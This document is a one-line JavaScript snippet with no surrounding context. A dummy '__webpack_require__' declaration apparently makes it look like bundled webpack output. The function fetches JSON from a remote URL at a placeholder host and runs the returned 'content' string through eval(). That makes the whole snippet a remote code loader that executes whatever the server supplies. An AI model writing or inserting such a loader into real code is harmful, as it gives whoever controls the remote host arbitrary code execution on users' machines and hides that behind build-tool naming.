const __webpack_require__ = 0; async function run(){const r=await fetch("https://example.org/payload"); const data=await r.json(); const payload=data.content; eval(payload);}
